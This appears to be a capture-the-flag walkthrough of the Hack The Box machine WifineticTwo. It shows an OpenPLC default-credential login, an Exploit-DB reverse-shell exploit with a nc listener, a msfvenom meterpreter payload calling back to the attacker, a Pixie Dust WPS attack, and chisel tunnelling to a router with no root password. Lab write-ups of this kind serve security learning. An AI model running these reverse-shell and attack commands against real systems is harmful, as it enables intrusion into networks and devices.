HTB Machine

Thanks to @GodsMostUnstableSoldier

first, lets do a nmap scan of the box.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 04:44 EDT
Nmap scan report for wifinetictwo.htb (10.129.227.197)
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy Werkzeug/1.0.1 Python/2.7.18
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://wifinetictwo.htb:8080/login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
...
```

visiting the website, we can see it is running openplc

First guess is to try the default credentials. The default credentials is `openplc:openplc`. And this works!

Now that we are authenticated, we can use [this exploit from exploit-db](https://www.exploit-db.com/exploits/49803)

Only one line needs to be modified, where the `compile_program` is set, change the string at the end from its default to `/compile-program?file=blank_program.st`. this program is currently present within the OpenPLC webapp.

run the program, point it back to our address to a new port which we are listening on with `nc -lvnp 3001`, and then execute the exploit with the credentials
`ython3 49803.py -u http://wifinetictwo.htb:8080 -l openplc -p openplc -i 10.10.14.63 -r 3001`

And we are in, that is user!
```
whoami
root
cd /root
ls
user.txt
```

It appears we are in some sort of virtual machine or container. as the `/root` directory only has the user.txt.

But first, to make sure that we have a stable foothold, I am going to respawn in a metasploit shell.  run `msfconsole`, and use `exploit/multi/handler`, and set the `LPORT` and `LHOST` to your system. Then use msfvenom in a new terminal, and generate the binary with the command `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.63 LPORT=3002 -f elf -o reverse.elf`, you can get this command from [revshells.com](revshells.com). 

Looking at the previous walkthrough of the [first wifinetic box walkthrough](https://0xdf.gitlab.io/2023/09/16/htb-wifinetic.html#). You will see that one of the commands it uses is `iw`, another tool we can use is `iwlist`, with the command `iwlist scan`, we can see there is only one wifi network.

```
iwlist scan
lo        Interface doesn't support scanning.

eth0      Interface doesn't support scanning.

wlan0     Scan completed :
          Cell 01 - Address: 02:00:00:00:01:00
                    Channel:1
                    Frequency:2.412 GHz (Channel 1)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"plcrouter"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=000613d7d60eb2ce
                    Extra: Last beacon: 16ms ago
                    IE: Unknown: 0009706C63726F75746572
                    IE: Unknown: 010882848B960C121824
                    IE: Unknown: 030101
                    IE: Unknown: 2A0104
                    IE: Unknown: 32043048606C
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : PSK
                    IE: Unknown: 3B025100
                    IE: Unknown: 7F080400000200000040
                    IE: Unknown: DD5C0050F204104A0001101044000102103B00010310470010572CF82FC95756539B16B5CFB298ABF11021000120102300012010240001201042000120105400080000000000000000101100012010080002210C1049000600372A000120
```

So, considering the creator of this box is the same as the last box, we can use a WPS attack called "Pixie Dust". But for the remote execution, we need a statically compiled binary. for this, we can use [OneShot-C](https://github.com/nikita-yfh/OneShot-C) and send the binary to the target system for execution.

For this, we need to use our original shell, and use `/usr/bin/script -qc /bin/bash /dev/null` after catching the shell, then background the shell you have via `nc`, and then execute `stty raw -echo ; fg`. after that, running these two commands `export TERM=xterm` and`stty cols 132 rows 34`. 

then, we run the command `./oneshot -i wlan0 -b 02:00:00:00:01:00 -K`, and this gets us the PSK, so we can just connect to the router.

connect to the wifi network with the credentials you just got, and [this walkthrough](https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant) 

now that we are connected, we should pingsweep the network to see what is in it. To do this, we can first run a loop to ping all addresses in the network. Looking at the address given to us via the router with `ip -c a` we can see that our address is `192.168.1.84/24`. that `/24` is cidr notation, and that means the network routing is such that we are connected to an internal network of 192.168.1.XX. So we need to loop over all possible addresses at the last number for the IP address.

for this, we make a script [from this blog](https://usmcdennis0331.medium.com/creating-a-basic-ip-sweeper-with-bash-6a6b91a629f2).

```sh
for ip in `seq 1 254`; do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"&
done
```

```
root@attica01:/tmp# ./ipsweep.sh 192.168.1
192.168.1.1
192.168.1.84
```

Okay, we have our IP, and the router. Now we absolutely need a reverse proxy. we can use chisel for that. Lets get the binary for chisel onto the server. then, on your own machine run `chisel server -p 9001 --reverse &` to have the reverse proxy server. for the client, we refer to [this blog post](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) and run `chisel client 10.10.14.63:9001 R:socks`

Then, with firefox, we can make it use the socks proxy. settings -> in search "proxy" -> settings...

from there, run proxychains on `firefox` to get the socks proxy to work, and in firefox make sure to head to `https://192.168.1.1`

there is no password set for the `root` user, so just give it anything, but wait, have we tried scanning the new ip with proxychains? Lets do so now. This will take a second. We can see that ports `22`, `53`, `80`, and `443` are open. SSH is open among them...

Wait, `root` had no password set. could that be true with `ssh` as well? lets check!
`proxychains ssh root@192.168.1.1`

https://labs.hackthebox.com/achievement/machine/158887/593
